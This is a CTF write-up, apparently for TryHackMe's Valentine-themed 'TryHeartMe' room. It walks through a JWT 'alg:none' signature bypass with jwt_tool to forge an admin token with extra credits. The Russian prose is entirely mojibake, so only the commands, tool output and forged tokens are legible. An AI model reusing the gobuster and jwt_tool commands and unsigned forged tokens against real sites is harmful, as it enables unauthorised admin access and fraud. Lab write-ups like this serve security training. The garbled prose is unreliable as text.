# TryHeartMe - CTF Writeup (–∫–æ–º–Ω–∞—Ç–∞ –∫–æ –î–Ω—é –°–≤—è—Ç–æ–≥–æ –í–∞–ª–µ–Ω—Ç–∏–Ω–∞)

<p align="center">
  <img src="https://img.shields.io/badge/–°–ª–æ–∂–Ω–æ—Å—Ç—å-–õ–µ–≥–∫–∞—è-green" />
  <img src="https://img.shields.io/badge/–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞-TryHackMe-red" />
  <img src="https://img.shields.io/badge/–ö–∞—Ç–µ–≥–æ—Ä–∏—è-Web-blue" />
</p>

## üéØ –í–≤–µ–¥–µ–Ω–∏–µ

**–ù–∞–∑–≤–∞–Ω–∏–µ –∫–æ–º–Ω–∞—Ç—ã:** TryHeartMe  
**–¢–µ–º–∞—Ç–∏–∫–∞:** –î–µ–Ω—å –°–≤—è—Ç–æ–≥–æ –í–∞–ª–µ–Ω—Ç–∏–Ω–∞ üíò  
**–£—è–∑–≤–∏–º–æ—Å—Ç—å:** –ê—Ç–∞–∫–∞ JWT Algorithm Confusion  
**–¶–µ–ª—å:** –í–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –Ω–∞ –ø–æ—Ä—Ç—É 5000

–í —ç—Ç–æ–º writeup –º—ã —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä—É–µ–º –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—É—é –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é JWT, —á—Ç–æ–±—ã –ø–æ–≤—ã—Å–∏—Ç—å –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏ —Å –æ–±—ã—á–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞, –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∑–∞–∫—Ä—ã—Ç–æ–º—É —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—É –∏ –≤ –∫–æ–Ω–µ—á–Ω–æ–º –∏—Ç–æ–≥–µ –∑–∞—Ö–≤–∞—Ç–∏—Ç—å —Ñ–ª–∞–≥.

---

## üîç –†–∞–∑–≤–µ–¥–∫–∞

### –ù–∞—á–∞–ª—å–Ω–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ

–ü–æ—Å–ª–µ –∑–∞–ø—É—Å–∫–∞ –º–∞—à–∏–Ω—ã –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞–µ–º –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –Ω–∞ –ø–æ—Ä—Ç—É **5000**.

```bash
http://TARGET_IP:5000
```

–ì–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π –∏–Ω—Ç–µ—Ä–Ω–µ—Ç-–º–∞–≥–∞–∑–∏–Ω –≤ —Ç–µ–º–∞—Ç–∏–∫–µ –î–Ω—è –°–≤—è—Ç–æ–≥–æ –í–∞–ª–µ–Ω—Ç–∏–Ω–∞.

![–ì–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞](photo-1.png)

### –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

–î–ª—è –Ω–∞—á–∞–ª–∞ –Ω–∞–º –Ω—É–∂–Ω–æ —Å–æ–∑–¥–∞—Ç—å –∞–∫–∫–∞—É–Ω—Ç, —á—Ç–æ–±—ã –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–æ–≤–∞—Ç—å —Å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ–º:

1. –ü–µ—Ä–µ—Ö–æ–¥–∏–º –Ω–∞ `/register`
2. –°–æ–∑–¥–∞—ë–º —É—á—ë—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:
   - Email: `test@gmail.com`
   - –ü–∞—Ä–æ–ª—å: `123456`
![–§–æ—Ä–º–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏](photo-2.png)
3. –£—Å–ø–µ—à–Ω–æ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–ª–∏—Å—å –∏ –≤–æ—à–ª–∏ –≤ —Å–∏—Å—Ç–µ–º—É

---

## üóÇÔ∏è –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π

–ò—Å–ø–æ–ª—å–∑—É—è –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –¥–ª—è –±—Ä—É—Ç—Ñ–æ—Ä—Å–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π (gobuster/dirbuster/feroxbuster), –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞–µ–º –Ω–µ—Å–∫–æ–ª—å–∫–æ –∏–Ω—Ç–µ—Ä–µ—Å–Ω—ã—Ö endpoint'–æ–≤:

```bash
gobuster dir -u http://TARGET_IP:5000 -w /usr/share/wordlists/dirb/common.txt
```

**–†–µ–∑—É–ª—å—Ç–∞—Ç—ã:**

```
/register             (Status: 200) [Size: 1517]
/login                (Status: 200) [Size: 1461]
/admin                (Status: 302) [Size: 223] [--> /login?next=/admin]
/account              (Status: 302) [Size: 227] [--> /login?next=/account]
/logout               (Status: 302) [Size: 189] [--> /]
```

### üö® –ö–ª—é—á–µ–≤–∞—è –Ω–∞—Ö–æ–¥–∫–∞: `/admin`

–°—É—â–µ—Å—Ç–≤—É–µ—Ç –∞–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å! –ü–æ–ø—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å –∫ –Ω–µ–π –¥–æ—Å—Ç—É–ø.

---

## üîê –ü–µ—Ä–≤–∏—á–Ω—ã–π –¥–æ—Å—Ç—É–ø –∏ –Ω–∞–±–ª—é–¥–µ–Ω–∏–µ

### –ü–æ–ø—ã—Ç–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –∞–¥–º–∏–Ω–∫–µ

–ü–µ—Ä–µ—Ö–æ–¥–∏–º –Ω–∞ `/admin` –±—É–¥—É—á–∏ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–º–∏ –∫–∞–∫ –æ–±—ã—á–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å:

![403 Forbidden](photo-3.png)

**–†–µ–∑—É–ª—å—Ç–∞—Ç:** `403 Forbidden - –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â—ë–Ω`

–≠—Ç–æ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç, —á—Ç–æ —Ç—Ä–µ–±—É—é—Ç—Å—è –ø—Ä–∞–≤–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞. –î–∞–≤–∞–π—Ç–µ –∏—Å—Å–ª–µ–¥—É–µ–º, –∫–∞–∫ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é.

---

## üîë –ê–Ω–∞–ª–∏–∑ JWT

### –ü—Ä–æ–≤–µ—Ä–∫–∞ cookies

–û—Ç–∫—Ä—ã–≤–∞–µ–º DevTools –±—Ä–∞—É–∑–µ—Ä–∞ (F12) ‚Üí Storage ‚Üí Cookies –∏–ª–∏ –∂–µ –†–∞–∑—à–∏—Ä–µ–Ω–∏–µ Cookie-Editor:

![–ü—Ä–æ—Å–º–æ—Ç—Ä cookie](photo-4.png)

–ù–∞—Ö–æ–¥–∏–º cookie —Å –∏–º–µ–Ω–µ–º: **`tryheartme_jwt`**

–°–∞–º–æ –Ω–∞–∑–≤–∞–Ω–∏–µ –≥–æ–≤–æ—Ä–∏—Ç –æ —Ç–æ–º, —á—Ç–æ —ç—Ç–æ **JSON Web Token (JWT)**.

### –î–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ JWT

–î–µ–∫–æ–¥–∏—Ä—É–µ–º —ç—Ç–æ—Ç —Ç–æ–∫–µ–Ω —Å –ø–æ–º–æ—â—å—é [fusionauth.io](https://fusionauth.io/dev-tools/jwt-decoder) –∏–ª–∏ –ª—é–±–æ–≥–æ –¥—Ä—É–≥–æ–≥–æ jwt decoder:

![JWT Decoder](photo-5.png)

**–°—Ç—Ä—É–∫—Ç—É—Ä–∞ —Ç–æ–∫–µ–Ω–∞:**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAZ21haWwuY29tIiwicm9sZSI6InVzZXIiLCJjcmVkaXRzIjowLCJpYXQiOjE3NzEwOTY0MjAsInRoZW1lIjoidmFsZW50aW5lIn0.z7E8TwQ8u18dFWf8Y7yz8If6wWswbeYFCfkoze8k0rU
```

**–î–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ (Header):**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**–î–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω–∞—è –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ (Payload):**
```json
{
  "email": "test@gmail.com",
  "role": "user",
  "credits": 0,
  "iat": 1771096420,
  "theme": "valentine"
}
```

### üéØ –í–µ–∫—Ç–æ—Ä –∞—Ç–∞–∫–∏ –æ–ø—Ä–µ–¥–µ–ª—ë–Ω

–ú—ã –≤–∏–¥–∏–º:
- **Role (—Ä–æ–ª—å):** `user` ‚Üê *–ú–æ–∂–Ω–æ –∏–∑–º–µ–Ω–∏—Ç—å –Ω–∞ `admin`*
- **Credits (–∫—Ä–µ–¥–∏—Ç—ã):** `0` ‚Üê *–í–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –≤–∞–ª—é—Ç–∞ –º–∞–≥–∞–∑–∏–Ω–∞ –∫–æ—Ç–æ—Ä—É—é –º–æ–∂–Ω–æ —É–≤–µ–ª–∏—á–∏—Ç—å*

### –ü–æ—á–µ–º—É —Ä—É—á–Ω–æ–µ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–µ—Ç

![–ù–µ–≤–∞–ª–∏–¥–Ω–∞—è –ø–æ–¥–ø–∏—Å—å](photo-6.png)


–ü—Ä–æ—Å—Ç–æ–µ –∏–∑–º–µ–Ω–µ–Ω–∏–µ payload –∏ –ø–æ–≤—Ç–æ—Ä–Ω–æ–µ –∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–µ—Ç, –ø–æ—Ç–æ–º—É —á—Ç–æ:
1. –¢–æ–∫–µ–Ω **–∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ–∏—á–µ—Å–∫–∏ –ø–æ–¥–ø–∏—Å–∞–Ω**
2. –°–µ—Ä–≤–µ—Ä –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –ø–æ–¥–ø–∏—Å—å —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Å–µ–∫—Ä–µ—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞
3. –õ—é–±–æ–µ –∏–∑–º–µ–Ω–µ–Ω–∏–µ –¥–µ–ª–∞–µ—Ç –ø–æ–¥–ø–∏—Å—å –Ω–µ–≤–∞–ª–∏–¥–Ω–æ–π
4. –ù–µ–≤–∞–ª–∏–¥–Ω—ã–µ —Ç–æ–∫–µ–Ω—ã = —Å–±—Ä–æ—Å —Å–µ—Å—Å–∏–∏ ‚Üí –ø—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω—ã–π –ø–æ–≤—Ç–æ—Ä–Ω—ã–π –≤—Ö–æ–¥ ("Please Log In." –∫–∞–∫ –Ω–∞ —Ñ–æ—Ç–æ –≤–∏—à–µ)

–ù—É–∂–µ–Ω –¥—Ä—É–≥–æ–π –ø–æ–¥—Ö–æ–¥...

---

## üõ†Ô∏è –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è —Å –ø–æ–º–æ—â—å—é jwt_tool

### –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞

[jwt_tool](https://github.com/ticarpi/jwt_tool) - —ç—Ç–æ –∫–æ–º–ø–ª–µ–∫—Å–Ω—ã–π –Ω–∞–±–æ—Ä –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ JWT.

```bash
# –ö–ª–æ–Ω–∏—Ä—É–µ–º —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–π
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool

# –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏
pip3 install -r requirements.txt --break-system-packages
```

### –ó–∞–ø—É—Å–∫ –≤—Å–µ—Ö –∞—Ç–∞–∫

–í—ã–ø–æ–ª–Ω—è–µ–º jwt_tool —Å —Ñ–ª–∞–≥–æ–º `-X a` –¥–ª—è –∑–∞–ø—É—Å–∫–∞ **–≤—Å–µ—Ö –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏—Ö –∞—Ç–∞–∫**:

```bash
python3 jwt_tool.py <–í–ê–®_JWT_–¢–û–ö–ï–ù> -X a
```

![–í—ã–≤–æ–¥ jwt_tool](photo-7.png)

**–†–µ–∑—É–ª—å—Ç–∞—Ç—ã –∞—Ç–∞–∫:**

```
jwttool_18bf5ba547ebf55e5be89143e46f8db6 - EXPLOIT: "alg":"none"
[+] eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJlbWFpbCI6InRlc3RAZ21haWwuY29tIiwicm9sZSI6InVzZXIiLCJjcmVkaXRzIjowLCJpYXQiOjE3NzEwOTczNjAsInRoZW1lIjoidmFsZW50aW5lIn0.

jwttool_b89a2c85de06dbdb5ba9ad97079ae3d8 - EXPLOIT: "alg":"None"
[+] eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJlbWFpbCI6InRlc3RAZ21haWwuY29tIiwicm9sZSI6InVzZXIiLCJjcmVkaXRzIjowLCJpYXQiOjE3NzEwOTczNjAsInRoZW1lIjoidmFsZW50aW5lIn0.

jwttool_c6eb031d4b39da1b587680d545d0387c - EXPLOIT: "alg":"NONE"
[+] eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJlbWFpbCI6InRlc3RAZ21haWwuY29tIiwicm9sZSI6InVzZXIiLCJjcmVkaXRzIjowLCJpYXQiOjE3NzEwOTczNjAsInRoZW1lIjoidmFsZW50aW5lIn0.

jwttool_fe798a702add8b6700177e88945638b1 - EXPLOIT: "alg":"nOnE"
[+] eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJlbWFpbCI6InRlc3RAZ21haWwuY29tIiwicm9sZSI6InVzZXIiLCJjcmVkaXRzIjowLCJpYXQiOjE3NzEwOTczNjAsInRoZW1lIjoidmFsZW50aW5lIn0.

```


jwt_tool —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–ª —Ç–æ–∫–µ–Ω—ã —Å **`alg: none`** - –∞–ª–≥–æ—Ä–∏—Ç–º–æ–º, –∫–æ—Ç–æ—Ä—ã–π –æ–∑–Ω–∞—á–∞–µ—Ç "–ø–æ–¥–ø–∏—Å—å –Ω–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è".

### –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —ç–∫—Å–ø–ª–æ–π—Ç–∞

–ü—Ä–æ–≤–µ—Ä–∏–º, –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –ª–∏ —Å–µ—Ä–≤–µ—Ä –Ω–µ–ø–æ–¥–ø–∏—Å–∞–Ω–Ω—ã–µ —Ç–æ–∫–µ–Ω—ã, –ø–æ–¥—Å—Ç–∞–≤–∏–≤ –∏—Ö –≤–º–µ—Å—Ç–æ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–≥–æ —Ç–æ–∫–µ–Ω–∞:

![–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∞–ª–≥–æ—Ä–∏—Ç–º–∞ none](photo-8.png)

1. –ë–µ—Ä—ë–º **–ø–µ—Ä–≤—ã–π —Ç–æ–∫–µ–Ω** –∏–∑ –≤—ã–≤–æ–¥–∞ jwt_tool
2. –ó–∞–º–µ–Ω—è–µ–º –∏–º —Ç–µ–∫—É—â—É—é cookie `tryheartme_jwt`
3. –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç—Ä–∞–Ω–∏—Ü—É

**–†–µ–∑—É–ª—å—Ç–∞—Ç:** ‚úÖ **–ú—ã –≤—Å—ë –µ—â—ë –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã!**

![–ü–æ–¥–º–µ–Ω–∞ JWT](photo-9.png)

–≠—Ç–æ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç, —á—Ç–æ —Å–µ—Ä–≤–µ—Ä **–ø—Ä–∏–Ω–∏–º–∞–µ—Ç —Ç–æ–∫–µ–Ω—ã —Å `alg: none`**, –ø–æ–ª–Ω–æ—Å—Ç—å—é –æ–±—Ö–æ–¥—è –ø—Ä–æ–≤–µ—Ä–∫—É –ø–æ–¥–ø–∏—Å–∏.

---

## ‚¨ÜÔ∏è –ü–æ–≤—ã—à–µ–Ω–∏–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π

### –ú–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è payload —Ç–æ–∫–µ–Ω–∞

–¢–µ–ø–µ—Ä—å, –∫–æ–≥–¥–∞ –º—ã –∑–Ω–∞–µ–º, —á—Ç–æ —Å–µ—Ä–≤–µ—Ä –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –Ω–µ–ø–æ–¥–ø–∏—Å–∞–Ω–Ω—ã–µ —Ç–æ–∫–µ–Ω—ã, –º—ã –º–æ–∂–µ–º —Å–æ–∑–¥–∞—Ç—å —Å–≤–æ–π —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—ã–π —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞:

```bash
python3 jwt_tool.py <–†–ê–ë–û–ß–ò–ô_NONE_–¢–û–ö–ï–ù> -T
```

–≠—Ç–æ –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç **–∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—ã–π —Ä–µ–∂–∏–º –ø–æ–¥–º–µ–Ω—ã —Ç–æ–∫–µ–Ω–∞**.

#### –®–∞–≥ 1: –ú–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è –∑–∞–≥–æ–ª–æ–≤–∫–∞


```
Token header values:
[1] alg = "none"
[2] typ = "JWT"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
```

–ù–∞–∂–∏–º–∞–µ–º **`0`** –¥–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è (–∑–∞–≥–æ–ª–æ–≤–æ–∫ —É–∂–µ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π).

#### –®–∞–≥ 2: –ú–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è payload


```
Token payload values:
[1] email = "test@gmail.com"
[2] role = "user"
[3] credits = 0
[4] iat = 1771097736
[5] theme = "valentine"
[6] *ADD A VALUE*
[7] *DELETE A VALUE*
[0] Continue to next step
```

**–ò–∑–º–µ–Ω–µ–Ω–∏—è:**
1. –í—ã–±–∏—Ä–∞–µ–º `[2]` ‚Üí –ú–µ–Ω—è–µ–º `role` —Å `"user"` –Ω–∞ `"admin"`
2. –í—ã–±–∏—Ä–∞–µ–º `[3]` ‚Üí –ú–µ–Ω—è–µ–º `credits` —Å `0` –Ω–∞ `5000`
3. –ù–∞–∂–∏–º–∞–µ–º `[0]` –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –Ω–æ–≤–æ–≥–æ —Ç–æ–∫–µ–Ω–∞

#### –®–∞–≥ 3: –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –Ω–æ–≤–æ–≥–æ —Ç–æ–∫–µ–Ω–∞

![–ù–æ–≤—ã–π —Ç–æ–∫–µ–Ω –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞](photo-10.png)

```json
{
  "email": "test@gmail.com",
  "role": "admin",
  "credits": 5000,
  "iat": 1771097736,
  "theme": "valentine"
}
```

**–ù–æ–≤—ã–π JWT:**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJlbWFpbCI6InRlc3RAZ21haWwuY29tIiwicm9sZSI6ImFkbWluIiwiY3JlZGl0cyI6NTAwMCwiaWF0IjoxNzcxMDk3NzM2LCJ0aGVtZSI6InZhbGVudGluZSJ9.
```

### –ü—Ä–∏–º–µ–Ω–µ–Ω–∏–µ —Ç–æ–∫–µ–Ω–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞

1. –ó–∞–º–µ–Ω—è–µ–º –∑–Ω–∞—á–µ–Ω–∏–µ cookie –Ω–∞ –Ω–∞—à –Ω–æ–≤—ã–π —Å–æ–∑–¥–∞–Ω–Ω—ã–π —Ç–æ–∫–µ–Ω
2. –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç—Ä–∞–Ω–∏—Ü—É

**–†–µ–∑—É–ª—å—Ç–∞—Ç:** üéä **–¢–µ–ø–µ—Ä—å –º—ã ADMIN —Å 5000 –∫—Ä–µ–¥–∏—Ç–∞–º–∏!**

---

## üèÜ –î–æ—Å—Ç—É–ø –∫ –∞–¥–º–∏–Ω-–ø–∞–Ω–µ–ª–∏ –∏ —Ñ–ª–∞–≥

### –î–æ—Å—Ç—É–ø –∫ –ø–∞–Ω–µ–ª–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞

–¢–µ–ø–µ—Ä—å, –∫–æ–≥–¥–∞ —É –Ω–∞—Å –µ—Å—Ç—å –ø—Ä–∞–≤–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞, –≤–µ—Ä–Ω—ë–º—Å—è –∫ `/admin`:

![–î–æ—Å—Ç—É–ø –∫ –∞–¥–º–∏–Ω-–ø–∞–Ω–µ–ª–∏](photo-11.png)

‚úÖ **–£—Å–ø–µ—Ö!** –ë–æ–ª—å—à–µ –Ω–∏–∫–∞–∫–æ–≥–æ 403 Forbidden.

### –°–µ–∫—Ä–µ—Ç–Ω–∞—è –ø–æ–∫—É–ø–∫–∞

–í –∞–¥–º–∏–Ω-–ø–∞–Ω–µ–ª–∏ –Ω–∞–∂–∏–º–∞–µ–º **Open ValenFlag**, –¥–æ—Å—Ç—É–ø–Ω—ã–π —Ç–æ–ª—å–∫–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º:

- **–¢–æ–≤–∞—Ä:** ValenFlag. Buy me for special Valentines flag
- **–¶–µ–Ω–∞:** 777 –∫—Ä–µ–¥–∏—Ç–æ–≤

**–Ω–∞–∂–∏–º–∞–µ–º buy**



–ü–æ—Å–ª–µ —Å–æ–≤–µ—Ä—à–µ–Ω–∏—è –ø–æ–∫—É–ø–∫–∏ –ø–æ–ª—É—á–∞–µ–º —Ñ–ª–∞–≥:

![–°–µ–∫—Ä–µ—Ç–Ω–∞—è –ø–æ–∫—É–ø–∫–∞](photo-12.png)


üéâ **–§–ª–∞–≥ –∑–∞—Ö–≤–∞—á–µ–Ω**

---


## üéì –ó–∞–∫–ª—é—á–µ–Ω–∏–µ

### –ö–ª—é—á–µ–≤—ã–µ –≤—ã–≤–æ–¥—ã

1. **JWT –Ω–µ —à–∏—Ñ—Ä—É–µ—Ç—Å—è** - Payload —Ç–æ–ª—å–∫–æ –∑–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω –≤ Base64, –ª—é–±–æ–π –º–æ–∂–µ—Ç –µ–≥–æ –ø—Ä–æ—á–∏—Ç–∞—Ç—å
2. **Algorithm confusion –æ–ø–∞—Å–Ω–∞** - –ù–∏–∫–æ–≥–¥–∞ –Ω–µ –¥–æ–≤–µ—Ä—è–π—Ç–µ –ø–æ–ª—é `alg` –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ –≤–≤–æ–¥–∞
3. **–ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–ø–∏—Å–∏ –∫—Ä–∏—Ç–∏—á–Ω–∞** - –ë–µ–∑ –Ω–µ—ë —Ç–æ–∫–µ–Ω—ã –º–æ–∂–Ω–æ —Å–≤–æ–±–æ–¥–Ω–æ –ø–æ–¥–¥–µ–ª—ã–≤–∞—Ç—å
4. **–ó–∞—â–∏—Ç–∞ –≤ –≥–ª—É–±–∏–Ω—É** - –ö–æ–º–±–∏–Ω–∏—Ä—É–π—Ç–µ –ø—Ä–æ–≤–µ—Ä–∫—É –ø–æ–¥–ø–∏—Å–∏ —Å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–º–∏ –ø—Ä–æ–≤–µ—Ä–∫–∞–º–∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏

### –¶–µ–ø–æ—á–∫–∞ –∞—Ç–∞–∫–∏

```
–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    ‚Üì
–ê–Ω–∞–ª–∏–∑ JWT cookie
    ‚Üì
–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–µ –∞—Ç–∞–∫–∏ jwt_tool
    ‚Üì
–ù–∞–π–¥–µ–Ω–∞ —É—è–∑–≤–∏–º–æ—Å—Ç—å Algorithm None
    ‚Üì
–ü–æ–¥–º–µ–Ω–∞ payload —Ç–æ–∫–µ–Ω–∞ (role: admin)
    ‚Üì
–ü–æ–ª—É—á–µ–Ω –¥–æ—Å—Ç—É–ø –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
    ‚Üì
–§–ª–∞–≥ –∑–∞—Ö–≤–∞—á–µ–Ω
```



---

<p align="center">
  <strong>–ö–æ–Ω–µ—Ü! üíò</strong><br>
  <em>–í—Å–µ–≥–¥–∞ —Ö–∞–∫–∞–π—Ç–µ –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ –∏ —ç—Ç–∏—á–Ω–æ.</em>
</p>

---

**–î–∞—Ç–∞:** 14 —Ñ–µ–≤—Ä–∞–ª—è 2026  
**–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞:** TryHackMe  
**–°–ª–æ–∂–Ω–æ—Å—Ç—å:** –õ—ë–≥–∫–∞—è  
**–¢–µ–≥–∏:** `#jwt` `#web` `#privilege-escalation` `#ctf` `#walkthrough` `#TryHeartMe` `#TryHackMe`
